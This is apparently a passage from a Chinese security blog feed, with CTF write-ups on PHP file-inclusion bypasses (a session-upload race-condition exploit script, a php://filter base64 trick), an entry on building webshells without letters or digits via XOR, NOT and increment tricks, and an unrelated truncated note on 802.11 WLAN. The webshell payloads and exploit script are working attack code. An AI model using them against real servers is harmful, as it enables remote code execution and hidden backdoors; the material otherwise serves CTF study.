class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>.被过滤了，没办法使用上面的方法了。</p><p>这里给出参考链接<a href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p><h3 id="php中的session-upload-progress"><a href="#php中的session-upload-progress" class="headerlink" title="php中的session.upload_progress"></a>php中的session.upload_progress</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>enabled <span class="token operator">=</span> on<span class="token number">2.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>cleanup <span class="token operator">=</span> on<span class="token number">3.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>prefix <span class="token operator">=</span> <span class="token string double-quoted-string">"upload_progress_"</span><span class="token number">4.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>name <span class="token operator">=</span> <span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token number">5.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>freq <span class="token operator">=</span> <span class="token string double-quoted-string">"1%"</span><span class="token number">6.</span> session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>min_freq <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在这里只需要知道前四项即可。首先，enable表示也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。</p><p>cleanup，上传文件之后，session文件中的内容会被删除。</p><p>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值<strong>可控</strong>；</p><p>flex与name共同构成sess文件名</p><h3 id="这里有几个问题"><a href="#这里有几个问题" class="headerlink" title="这里有几个问题"></a>这里有几个问题</h3><p>没有session_start能否创建sess文件。</p><p>答案是可以。session还有一个默认选项，session.use_strict_mode默认值为0。我们在包中设置cookie= PHPSESSID=violet。PHP将会在服务器上创建一个文件：/tmp/sess_violet”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，</p><p>使用条件竞争。</p><p>这里就可以使用羽师傅的脚本了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> syssession<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>sess<span class="token operator">=</span><span class="token string">'yu22x'</span>url1<span class="token operator">=</span><span class="token string">"http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080/"</span>url2<span class="token operator">=</span><span class="token string">'http://05b536c9-c839-4df4-80a9-ddbc1ddeb979.challenge.ctf.show:8080?file=/tmp/sess_'</span><span class="token operator">+</span>sessdata1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token punctuation">&#125;</span>data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'system("cat f*");'</span><span class="token punctuation">&#125;</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'abc'</span><span class="token punctuation">&#125;</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sess<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'ctfshow&#123;'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span>       threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);    &#125;else&#123;    highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里主要看p神的文章，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p><p>因为die会导致我们的php代码无法执行，所以我们必须想办法去进行绕过，这里的主要思想就是，使用php://filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，当$content被加上了<?php exit; ?>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<?php exit; ?>没有了。</p><p>核心思想包括这么几点：</p><ol><li><p>base64读取时会自动绕过特殊字符<?php die();?>就会变成phpdie</p></li><li><p>base64读取时，以8个为单位，所以我们要在我们编码钱吗添加aa</p></li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/116205407">https://blog.csdn.net/miuzzx/article/details/116205407</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>无字母数字Webshell</title>
      <link href="/2021/10/07/wu-zi-mu-webshell/"/>
      <url>/2021/10/07/wu-zi-mu-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>上述代码主要过滤了字母和数字，而我们的目的就是使用shell获取信息。以往来说，我们的shell都是通过字母构建的，而这次被过滤了，所以我们需要新的思路。</p><p>因而，我们的核心思路就是，通过非数字和字母来构建a-z。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>我们知道，在php中，两个字符串异或后结果仍为字符串。因而，我们可以通过两个非字母的字符串异或来获得字母。同时，我们知道一般字符在ascii中最后位置为127。而汉字的编码utf-8就是由这些大于128的字符表示的。下面的代码可以帮助我们获得从a-z的各种构造方式。<br>php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。</p><p>注意，括号貌似没法编码后使用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">""</span>s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入"</span><span class="token punctuation">)</span><span class="token keyword">for</span> s1 <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dec <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">255</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s1 <span class="token operator">==</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码，我们就可以得到结果与FF异或就可以得到相应的字符。</p><p>我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。</p><p>很多的preg_match会过滤掉”.”,所以需要使用异或运算进行绕过,很多的免杀马都是这样制作的。php对字符进行异或运算是先将字符转换成ASCII码然后进行异或运算,并且php能直接对一串字符串进行异或运算,例如”123”^”abc”是”1”与”a”进行异或然后”2”与”b”进行异或,以此类推,在异或结束后就获得了想要的字符串。</p><p>注意，进行异或运算时要将数字转换成字符形式,如果数字(int)和字符异或的话,结果只会是数字,例如1^”a”=1,”a”^2=2,将数字转换成字符串可以使用trim()函数。</p><p>php的eval()函数在执行时如果内部有类似”abc”^”def”的计算式，那么就先进行计算再执行，我们可以利用再创参数来实现更方便的操作,例如传入?a=$_GET[b],由于b不受限制就可以任意传值了。</p><pre class="line-numbers language-none"><code class="language-none">注意1: 在测试过程中发现问题，类似phpinfo();，需要将后面的();放在第一个参数的后面,例如url?a&#x3D;&#123;_GET&#125;&#123;b&#125;();&amp;b&#x3D;phpinfo,也就是?a&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo,在传入后实际上为$&#123;????^????&#125;&#123;?&#125;();但是到了eval()函数内部就会变成$&#123;_GET&#125;&#123;?&#125;();成功执行。注意2：测试中发现，传值时对于要计算的部分不能用括号括起来,因为括号也将被识别为传入的字符串,可以使用&#123;&#125;代替,原因是php的use of undefined constant特性,例如$&#123;_GET&#125;&#123;a&#125;这样的语句php是不会判为错误的,因为&#123;&#125;使用来界定变量的,这句话就是会将_GET自动看为字符串,也就是$_GET[&#39;a&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">shell&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo&#x2F;&#x2F; %ff%ff%ff%ff^%a0%b8%ba%ab为_GET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert($_POST[_]);</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="1.png"></p><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>我们在上面的基础上使用assert函数。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">$_&#x3D;&quot;%9E%8C%8C%9A%8D%8B&quot;^&quot;%FF%FF%FF%FF%FF%FF&quot;;$__&#x3D;&quot;%A0%AF%B0%AC%AB&quot;^&quot;%FF%FF%FF%FF%FF&quot;;$___&#x3D;$$__;$_($___[_]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>与方法一方法类似，我们这里使用反操作。</p><p>那么如何获取字符串的取反结果。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'$_GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后得到下面的结果：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?shell&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>需要注意的是这个payload只能使用在php版本为7.0以后。</p><h4 id="assert-1"><a href="#assert-1" class="headerlink" title="assert"></a>assert</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">~</span><span class="token string double-quoted-string">"%9e%8c%8c%9a%8d%8b"</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">~</span><span class="token string double-quoted-string">"%a0%af%b0%ac%ab"</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个php5.0也可</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>除了位运算还有其他的方式。</p><p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PHP5和7的区别"><a href="#PHP5和7的区别" class="headerlink" title="PHP5和7的区别"></a>PHP5和7的区别</h2><p>PHP5中，assert()是一个函数，我们可以用_()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。</p><p>PHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>接下来的代码，多过滤字符$,_，并且字符长度方面有所闲置，导致我们上面的payload无法使用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_$]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>在PHP7中我们可以使用反操作中。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>shell<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而PHP5中我们需要新的操作。我们所学的各种语言并不是独立运作的，它们都可以与操作系统进行交互，因而我们可以从这里作为突破口。</p><h3 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h3><h2 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h2><p>这里说一下我出现的问题，有时候输入payload的时会参杂回车，导致报文被截断了，从而后面的数据部分无法正常发出，导致回显错误。</p><h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><p><a href="https://www.hetianlab.com/specialized/20201124173456">浅析CTF绕过字符数字构造shell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线</title>
      <link href="/2021/10/06/wu-xian/"/>
      <url>/2021/10/06/wu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="IEE-802-11"><a href="#IEE-802-11" class="headerlink" title="IEE 802.11"></a>IEE 802.11</h2><p>定义了WLAN Mac和物理层协议</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul><li><p>与有线服务交互</p></li><li><p>更高的传输速率</p></li><li><p>更高可靠性</p></li><li><p>持续的网络连接</p></li></ul><h3 id="设立的协议"><a href="#设立的协议" class="headerlink" title="设立的协议"></a>设立的协议</h3><p>多个物理层协议：IR，FHSS，DSSS，OFDM，FDMA</p><p>MAC 子协议：</p><p>MAC管理协议和服务</p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>它以蜂窝网络（cellular architecture）为基础，划分为多个BSS（ Basic Service Set），每个BSS由AP控制（Access Point）</p><p>WLAN可以由一个BSS和一个AP构成。但是，一般来说它是由多个BSS组成，其中AP是有名叫分布式系统主干（DS）连接的，例如因特网。</p><p>相互连接的WLAN由BSSs，AP，DS组成构成802网络，又被称为ESS（Extended Service Set）</p><p><img src="1.png"></p><p>IBSS不需要AP，可以直接进行互相交流</p><h3 id="连接模式"><a href="#连接模式" class="headerlink" title="连接模式"></a>连接模式</h3><h4 id="Infrastructure-mode"><a href="#Infrastructure-mode" class="headerlink" title="Infrastructure mode"></a>Infrastructure mode</h4><p>端与端之间交流通过一个，或者多个通过有线进行连接的AP进行连接。</p><ul><li><p>端选择一个AP并与其连接</p></li><li><p>AP支持漫游（AP support 